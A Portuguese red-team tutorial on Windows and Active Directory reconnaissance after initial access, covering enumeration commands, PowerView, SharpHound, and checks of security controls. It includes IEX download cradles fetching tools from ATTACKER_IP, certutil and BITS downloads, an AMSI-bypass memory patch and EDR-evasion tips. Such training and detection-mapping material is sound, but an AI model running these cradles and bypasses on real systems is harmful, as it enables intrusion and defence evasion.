---
layout: cyber
section: pos-expl-windows
title: "Enumeração e Situational Awareness no Windows"
---

# 01 - Enumeração e Situational Awareness no Windows

## O Primeiro Minuto Decide o Engajamento

Quando o operador ganha execução de código em Windows, o instinto imediato é escalar privilégio ou mover lateralmente. Esse instinto, sem controle, leva a detecção precoce. O primeiro minuto após acesso inicial determina se a operação vira sucesso ou incidente de segurança.

**Situational awareness** é o processo de entender o ambiente antes de agir. Sem ele o operador age às cegas: escala privilégio pra conta monitorada, move pra segmento com IDS ativo, ou aciona alerta tentando acessar recurso que já tem permissão. MITRE ATT&CK relevantes: T1033 (System Owner/User Discovery), T1016 (Network Config Discovery), T1049 (Network Connections Discovery), T1057 (Process Discovery), T1082 (System Information Discovery), T1087 (Account Discovery), T1069 (Permission Groups Discovery), T1018 (Remote System Discovery), T1482 (Domain Trust Discovery).

Trade-off fundamental: **velocidade vs. OPSEC**. Cada comando executado é artefato potencial. Objetivo: coletar máximo de informação com mínimo de ruído.

---

## Três Camadas: Host, Rede, Domínio

### O Modelo Mental Correto

Pense em três camadas concêntricas:

1. **Contexto Imediato**: Quem sou eu? Em qual máquina? Quais são meus privilégios agora?
2. **Contexto Local**: O que existe nesta máquina? Quais usuários, processos, conexões, configurações?
3. **Contexto de Domínio**: Qual é a topologia do Active Directory? Onde estão os alvos de alto valor?

Cada camada informa a próxima. Você não faz recon de domínio antes de entender seu contexto imediato, pois pode estar em um honeypot, em um segmento isolado, ou como um usuário com permissões mínimas.

### Fontes de Dados no Windows

O Windows expõe informações do sistema através de múltiplos canais:

- **Win32 API**: Interface nativa, menos suspeita
- **WMI (Windows Management Instrumentation)**: Poderoso, mas monitorado
- **Registry**: Contém configurações críticas, persistência, credenciais
- **Comandos nativos** (net.exe, sc.exe, etc.): Simples, mas muito monitorados
- **PowerShell**: Flexível, com capacidade de logging (ScriptBlock, Module, Transcription)
- **LDAP**: Queries diretas ao Active Directory

### Logging e Detecção

O que gera logs no Windows:
- **Event ID 4688**: Criação de processo (Process Creation) - requer auditoria habilitada
- **Event ID 4104**: PowerShell ScriptBlock Logging
- **Sysmon Event 1**: Process creation com linha de comando completa
- **WMI Activity Log**: Queries WMI ficam em `Microsoft-Windows-WMI-Activity/Operational`

O que **não** gera logs por padrão:
- Leitura de registry sem modificação
- Queries LDAP diretas (exceto em DCs configurados)
- Comandos net.exe em muitos ambientes

---

## Na Prática

### Checklist de Execução Imediata (Primeiros 60 Segundos)

A ordem importa. Execute na sequência para construir contexto antes de agir.

#### Fase 1: Identidade e Privilégios

```
whoami /all
```

Este comando é o mais crítico. Ele revela:
- **Nome do usuário** (DOMAIN\username ou HOSTNAME\username)
- **SID** do usuário (Security Identifier único)
- **Grupos** aos quais pertence (local e de domínio)
- **Privilégios** habilitados no token atual

Saída de exemplo para um usuário de serviço com SeImpersonatePrivilege:
```
USER INFORMATION
----------------
User Name            SID
==================== ============================================
nt authority\network service  S-1-5-20

GROUP INFORMATION
-----------------
Group Name                             Type             SID
====================================== ================ ============
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6
NT AUTHORITY\Authenticated Users       Well-known group S-1-1-2
...

PRIVILEGE INFORMATION
---------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
```

Ver `SeImpersonatePrivilege` habilitado imediatamente indica potencial para PrintSpoofer/JuicyPotato. Ver `SeDebugPrivilege` indica capacidade de fazer dump do LSASS.

#### Fase 2: Hostname e Sistema Operacional

```
hostname
ver
systeminfo
```

`systeminfo` fornece versão do OS, data de instalação, hotfixes instalados, arquitetura, domínio e mais. É mais barulhento que os outros mas essencial para identificar vulnerabilidades do kernel e patches faltantes.

Para versão do OS de forma silenciosa:
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
```

#### Fase 3: Rede

```
ipconfig /all
```

Revela interfaces de rede, endereços IP (incluindo IPv6), DNS servers, DHCP, domínio DNS. O nome do domínio DNS é frequentemente diferente do nome NetBIOS do domínio.

```
netstat -ano
```

Lista todas as conexões TCP/UDP com PIDs. Identifica:
- Conexões estabelecidas (quem esta máquina está falando)
- Portas em listening (quais serviços estão ativos)
- PIDs dos processos associados (para cruzar com tasklist)

```
arp -a
```

Tabela ARP local. Revela hosts vizinhos que se comunicaram recentemente com esta máquina. Excelente para descoberta rápida de hosts sem escanear a rede.

```
route print
```

Tabela de roteamento. Revela sub-redes alcançáveis, gateways padrão e rotas estáticas configuradas.

#### Fase 4: Usuários e Grupos Locais

```
net user
net user <username>
net localgroup
net localgroup Administrators
```

Identifica todos os usuários locais, membros do grupo Administrators local, e outros grupos relevantes (Remote Desktop Users, Backup Operators, etc.).

#### Fase 5: Processos e Serviços

```
tasklist /v
tasklist /svc
```

`/v` mostra verbose (usuário executando cada processo). `/svc` mostra serviços associados a cada processo. Identifica processos de segurança (antivírus, EDR, monitoramento) e processos privilegiados que podem ser alvos de token stealing.

```
sc query
sc query type= all state= all
```

Lista todos os serviços Windows com estado atual. Identifica serviços vulneráveis para escalada de privilégio.

---

## Exemplos de Código / Comandos

### Bloco de Enumeração Rápida (CMD)

Execute sequencialmente para capturar snapshot do sistema:

```cmd
@echo off
echo === IDENTITY ===
whoami /all

echo === HOSTNAME/OS ===
hostname
ver
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain" /C:"Hotfix"

echo === NETWORK ===
ipconfig /all
netstat -ano
arp -a
route print

echo === USERS/GROUPS ===
net user
net localgroup
net localgroup Administrators

echo === PROCESSES ===
tasklist /v
tasklist /svc

echo === SERVICES ===
sc query type= all state= all

echo === SCHEDULED TASKS ===
schtasks /query /fo LIST /v

echo === INSTALLED SOFTWARE ===
wmic product get name,version,installdate
```

### PowerShell - Enumeração Completa

```powershell
# Informações do sistema de forma estruturada
$sysinfo = @{
    Hostname    = $env:COMPUTERNAME
    Domain      = $env:USERDOMAIN
    User        = $env:USERNAME
    OS          = (Get-WmiObject Win32_OperatingSystem).Caption
    BuildNumber = (Get-WmiObject Win32_OperatingSystem).BuildNumber
    LastBoot    = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime
}
$sysinfo | Format-Table -AutoSize

# Usuários locais
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet

# Membros do grupo Administrators local
Get-LocalGroupMember -Group "Administrators"

# Conexões de rede ativas
Get-NetTCPConnection -State Established | 
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object OwningProcess

# Processos com owner
Get-WmiObject Win32_Process | 
    Select-Object Name, ProcessId, @{N='Owner';E={$_.GetOwner().User}} |
    Sort-Object Owner

# Serviços em execução
Get-Service | Where-Object {$_.Status -eq 'Running'} | 
    Select-Object Name, DisplayName, StartType

# Tarefas agendadas
Get-ScheduledTask | 
    Where-Object {$_.State -ne 'Disabled'} |
    Select-Object TaskName, TaskPath, State |
    Format-Table -AutoSize

# Shares de rede acessíveis
Get-SmbShare

# Sessões de rede abertas (requer privilégio)
Get-SmbSession
```

### Verificação do Estado do Windows Defender

```powershell
# Status do Defender - crítico para OPSEC
Get-MpComputerStatus | Select-Object `
    AMRunningMode,
    AntispywareEnabled,
    AntivirusEnabled,
    BehaviorMonitorEnabled,
    IoavProtectionEnabled,
    NISEnabled,
    OnAccessProtectionEnabled,
    RealTimeProtectionEnabled,
    AMProductVersion,
    AMEngineVersion,
    AntivirusSignatureLastUpdated

# Exclusões configuradas (ouro para operadores)
Get-MpPreference | Select-Object `
    ExclusionPath,
    ExclusionExtension,
    ExclusionProcess,
    AttackSurfaceReductionOnlyExclusions

# Verificar se Defender está sendo suprimido por GPO
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
```

Se `Get-MpComputerStatus` retorna `AMRunningMode: Passive`, o Defender está em modo passivo (provavelmente há outro AV como produto principal). Se retorna `NotRunning`, pode estar desabilitado ou suprimido por GPO.

### Verificação do Firewall

```cmd
netsh advfirewall show allprofiles
netsh advfirewall show allprofiles state
```

```powershell
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'} |
    Select-Object DisplayName, Action, Protocol |
    Format-Table -AutoSize
```

### Verificação de AppLocker

AppLocker pode bloquear execução de payloads. Sempre verificar antes de tentar executar ferramentas:

```powershell
# Política efetiva atual
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Em XML para análise detalhada
Get-AppLockerPolicy -Effective -Xml

# Políticas por tipo de regra
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections | 
    Where-Object {$_.Count -gt 0}
```

Se `Get-AppLockerPolicy` retorna erro de WMI ou política vazia, AppLocker provavelmente não está configurado. Se retorna regras, identifique:
- Caminhos permitidos (frequentemente `C:\Program Files\`, `C:\Windows\`)
- Hashes permitidos
- Caminhos onde você pode escrever E executar (ex: `C:\Windows\Tasks\`, `C:\Windows\Temp\`)

### WDAC (Windows Defender Application Control)

Mais moderno e difícil de bypassar que AppLocker:

```powershell
# Verificar se WDAC está ativo
Get-CimInstance -Namespace root/Microsoft/Windows/CI -ClassName PS_UpdateAndComplyCI

# Modo de enforcement
reg query "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config"
```

### PowerView para Active Directory Recon

PowerView é a ferramenta padrão de recon de AD em red team. Importar sem tocar disco:

```powershell
# Carregar PowerView via download cradle (evita disco)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Ou via AMSI bypass + carregamento em memória
# (ver seção de evasão)
```

#### Enumeração de Domínio

```powershell
# Informações básicas do domínio
Get-Domain
Get-DomainController
Get-DomainController -Domain forest.local  # Para outros domínios da floresta

# Enumeração de trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping  # Mapeia todos os trusts recursivamente

# Usuários do domínio
Get-DomainUser | Select-Object samaccountname, description, pwdlastset, logoncount, badpwdcount

# Usuários com descrição (frequentemente contém senhas)
Get-DomainUser -Properties description | Where-Object {$_.description -ne $null}

# Usuários com SPN configurado (alvos de Kerberoasting)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Usuários com AS-REP Roasting habilitado
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Usuários com AdminCount=1 (estiveram em grupos privilegiados)
Get-DomainUser -AdminCount | Select-Object samaccountname, admincount, memberof

# Grupos do domínio
Get-DomainGroup | Select-Object samaccountname, description, member
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse
Get-DomainGroupMember -Identity "Schema Admins" -Recurse

# Computadores do domínio
Get-DomainComputer | Select-Object dnshostname, operatingsystem, operatingsystemversion, lastlogontimestamp
Get-DomainComputer -Unconstrained  # Computadores com Unconstrained Delegation
Get-DomainComputer -TrustedToAuth   # Computadores com Constrained Delegation
```

#### Enumeração de GPOs

```powershell
# Todas as GPOs
Get-DomainGPO | Select-Object displayname, gpcfilesyspath, whenchanged

# GPOs com restrições de grupos locais (podem revelar quem tem admin local onde)
Get-DomainGPO -Properties gpcfilesyspath | Get-DomainGPOLocalGroup

# Computadores afetados por uma GPO específica
Get-DomainGPO -Identity "Default Domain Policy" | Get-DomainGPOComputerLocalGroupMapping

# Usuários afetados por GPOs que concedem acesso admin local
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators
```

#### Enumeração de Sessões e Acesso Local Admin

```powershell
# CRÍTICO: Encontrar onde você tem admin local
# (requer permissões adequadas - pode ser barulhento)
Find-LocalAdminAccess -Verbose
Find-LocalAdminAccess -ComputerName (Get-DomainComputer | Select-Object -ExpandProperty dnshostname)

# Sessões ativas em computadores remotos (usuários logados agora)
# (requer acesso admin no alvo ou Server service acessível)
Get-NetSession -ComputerName DC01
Get-NetSession -ComputerName (Get-DomainComputer | Select-Object -ExpandProperty dnshostname)

# Usuários logados em computadores remotos
Get-NetLoggedon -ComputerName DC01
Get-NetLoggedon -ComputerName FILESERVER01

# Onde um usuário específico está logado
Find-DomainUserLocation -UserName "john.admin"
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Compartilhamentos acessíveis
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.config,*.ps1,*.bat
```

#### Enumeração de ACLs no AD

```powershell
# ACLs interessantes no domínio (usuários com permissões sobre outros objetos)
Find-InterestingDomainAcl -ResolveGUIDs | 
    Where-Object {$_.IdentityReferenceName -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'}

# ACLs de um objeto específico
Get-DomainObjectAcl -Identity "CN=Domain Admins,CN=Users,DC=corp,DC=local" -ResolveGUIDs

# Quem tem WriteDACL ou GenericAll sobre o domínio
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "WriteDacl|GenericAll|WriteOwner"}
```

### BloodHound Collection com SharpHound

SharpHound é o collector oficial do BloodHound. Múltiplos métodos de coleta:

```powershell
# Importar SharpHound (em memória)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')

# Coleta completa (mais barulhenta, mais dados)
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\ -OutputPrefix "corp"

# Apenas dados do DC (menos barulhento, sem sessões)
Invoke-BloodHound -CollectionMethod DCOnly -OutputDirectory C:\Temp\

# Coleta de sessões (requer acesso admin em hosts)
Invoke-BloodHound -CollectionMethod Session -OutputDirectory C:\Temp\

# Coleta via LDAP apenas (mais silenciosa, sem conexões laterais)
Invoke-BloodHound -CollectionMethod Default -NoSaveCache -RandomizeFilenames -EncryptZip

# Coleta com evasão (stealth mode)
Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDomainControllers

# Com credenciais alternativas
Invoke-BloodHound -CollectionMethod All -LdapUsername "user" -LdapPassword "pass"
```

Métodos de coleta disponíveis:
- `All`: Todos os métodos (Default + GPOLocalGroup + LoggedOn + ObjectProps + ACL + Container + RDP + DCOM + PSRemote)
- `Default`: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
- `DCOnly`: Informações via LDAP do DC (sem conexões laterais)
- `Session`: Sessões ativas nos hosts
- `LoggedOn`: Usuários logados (requer admin local)
- `ACL`: ACLs do AD
- `Group`: Memberships de grupos
- `LocalAdmin`: Admin local via GPO

#### SharpHound via Executável

```cmd
# Execução direta
SharpHound.exe -c All --OutputDirectory C:\Temp\ --OutputPrefix "corp_recon"

# Modo stealth com delay aleatório entre queries
SharpHound.exe -c All --Stealth --RandomizeFilenames --EncryptZip --ZipPassword infected

# Coleta distribuída (útil em ambientes grandes)
SharpHound.exe -c Default --SearchBase "OU=Servers,DC=corp,DC=local"

# Com throttle para reduzir barulho na rede
SharpHound.exe -c All --Throttle 1000 --Jitter 10
```

---

## Detecção e OPSEC

### O Que Gera Alertas

**Alto Risco de Detecção:**
- `systeminfo` - muito monitorado por EDRs, gera Event 4688
- `net user /domain` - query LDAP que pode acionar alertas
- `Find-LocalAdminAccess` - tenta conexão SMB com todos os hosts, muito barulhento
- `Get-NetSession` / `Get-NetLoggedon` em múltiplos hosts - varredura de rede detectável
- SharpHound com método `All` - gera tráfego LDAP massivo, visível em DCs

**Risco Médio:**
- `ipconfig /all` - benigno mas é artefato típico de pós-exploração
- `tasklist /v` - comum mas pode ser correlacionado com outros eventos
- PowerView queries simples de domínio (Get-DomainUser, Get-DomainComputer)

**Baixo Risco:**
- `whoami` - extremamente comum, difícil de diferenciar de uso legítimo
- `hostname` - benigno
- `arp -a` - benigno
- `net user` (local, sem /domain) - benigno
- Queries registry passivas

### Técnicas de Evasão

#### Executar via WMI ao invés de cmd.exe

```powershell
# Ao invés de executar diretamente, invocar via WMI
$wmi = [wmiclass]"Win32_Process"
$result = $wmi.Create("whoami /all > C:\Temp\out.txt")
```

#### Evitar PowerShell para Enumeração Básica

EDRs monitoram PowerShell intensivamente. Para enumeração básica, prefira:
- Queries diretas à Win32 API via C#/BOF
- LDAP queries nativas sem PowerShell
- Comandos CMD nativos menos suspeitos

#### Download Cradles Alternativos

```powershell
# Ao invés de DownloadString comum
$data = (New-Object Net.WebClient).DownloadString('http://server/tool.ps1')

# Usar BITS (Background Intelligent Transfer Service)
Start-BitsTransfer -Source 'http://server/tool.ps1' -Destination 'C:\Temp\tool.ps1'

# Via certutil (LOLBin)
certutil -urlcache -f http://server/tool.ps1 C:\Temp\tool.ps1

# Via Excel COM Object (incomum, pode evadir)
$excel = New-Object -ComObject Excel.Application
```

#### AMSI Bypass para PowerShell

Antes de executar scripts PowerShell em ambientes com AMSI ativo:

```powershell
# Patch de memória AMSI (várias variações existem)
$a = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like '*iUtils'}
$b = $a.GetFields('NonPublic,Static') | Where-Object {$_.Name -like '*Context'}
$b.SetValue($null, [IntPtr]::Zero)
```

**Nota**: Patches de AMSI são específicos de versão e detecção do patch em si pode gerar alertas. Use apenas quando necessário.

#### Operacional: Quando Parar

Sinais de que você pode estar sendo observado:
- Suas conexões começam a falhar em sequência (honeypot detectando varredura)
- Processos de sua sessão são terminados inexplicavelmente
- Conexão C2 apresenta latência incomum ou respostas estranhas
- Você encontra diretórios "bait" com nomes muito atrativos (`admin_passwords.txt`, `service_accounts.xlsx`)

---

## Módulos Relacionados

`02_escalada_de_privilegio.md` consome dados de `whoami /all` (SeImpersonatePrivilege, SeDebugPrivilege) pra determinar vetor de escalada. `03_credenciais_windows.md` usa processos identificados em `tasklist` como candidatos pra token stealing e sessões admin como alvo de LSASS dump. `04_token_impersonation.md` consome `Get-NetLoggedon` e `Get-NetSession` pra identificar tokens disponíveis. `05_persistencia.md` consome enumeração de AppLocker/WDAC pra escolher mecanismo viável. `09_active_directory/08_bloodhound_e_enumeracao.md` importa o zip do SharpHound pra análise visual de caminhos.

---

## Leitura Complementar

- PowerView — https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- SharpHound — https://github.com/BloodHoundAD/SharpHound
- LOLBAS — https://lolbas-project.github.io/
